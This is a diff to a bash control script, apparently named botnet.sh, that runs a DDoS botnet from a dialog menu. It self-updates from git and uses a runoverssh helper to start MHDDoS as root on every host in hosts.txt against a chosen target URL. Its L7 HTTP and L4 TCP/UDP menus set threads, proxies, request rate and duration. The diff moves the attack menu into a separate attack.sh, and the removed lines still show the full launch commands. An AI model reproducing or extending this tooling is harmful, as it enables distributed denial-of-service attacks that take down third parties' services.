@@ -1,10 +1,9 @@
 #!/bin/bash
 
-SCRIPT=$(readlink -f "$0")
-SCRIPTPATH=$(dirname "$SCRIPT")
-SCRIPTNAME="$0"
+SCRIPT_DIR=$(dirname "$0")
+export SCRIPT_DIR
 
-cd $SCRIPTPATH
+cd $SCRIPT_DIR
 git fetch
 
 [[ -n $(git log ..origin/master) ]] && {
@@ -12,7 +11,7 @@ git fetch
     git checkout master
     git pull --force
     echo "Running the new version..."
-    exec "$SCRIPTNAME"
+    exec "$SCRIPT_DIR/botnet.sh"
 
     # Now exit this old instance
     exit 1
@@ -20,8 +19,6 @@ git fetch
 echo "Already the latest version."
 
 
-SCRIPT_DIR=$(dirname "$0")
-export SCRIPT_DIR
 touch -a "$SCRIPT_DIR/hosts.txt"
 export DIALOGRC="$SCRIPT_DIR/.dialogrc"
 
@@ -31,47 +28,7 @@ while : ; do
     case $MENU_OPTION in
 
     1) #Botnet attack on host
-        MENU_OPTION=$(dialog --title 'Attack type' --menu --stdout "Choose option:" 15 55 2 1 'L7 Attack - HTTP protocol' 2 'L4 Attack - TCP/UPD protocol' 3 'Back')
-
-        case $MENU_OPTION in
-
-        1)
-            ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l7.sh")
-            TARGET=$(bash "${SCRIPT_DIR}/menus/url.sh")
-            SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
-            THREADS=$(bash "${SCRIPT_DIR}/menus/threads.sh")
-            PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")
-            RPS=$(bash "${SCRIPT_DIR}/menus/rps.sh")
-            DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")
-
-            clear
-            printf "Starting L7 attack...\n"
-            bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $SOCKS_TYPE $THREADS $PROXY_FILE $RPS $DURATION" --hostsfile "$SCRIPT_DIR/hosts.txt"
-
-            break
-            ;;
-
-        2)
-            ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l4.sh")
-            TARGET=$(bash "${SCRIPT_DIR}/menus/url.sh")
-            THREADS=$(bash "${SCRIPT_DIR}/menus/threads.sh")
-            DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")
-            SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
-            PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")
-
-            clear
-            printf "Starting L4 attack...\n"
-            bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $THREADS $DURATION $SOCKS_TYPE $PROXY_FILE" --hostsfile "$SCRIPT_DIR/hosts.txt"
-
-            break
-            ;;
-
-
-        3)
-            continue
-            ;;
-
-        esac
+        bash "$SCRIPT_DIR/attack.sh"
         ;;
         
     2) #Bandwidth monitoring
@@ -98,7 +55,7 @@ while : ; do
         printf "$output" > "$SCRIPT_DIR/output.txt"
         dialog --title "Hosts and their active attacks" --textbox "$SCRIPT_DIR/output.txt" 30 50
 
-        break
+        continue
         ;;
 
     4) #Stop all botnet attacks
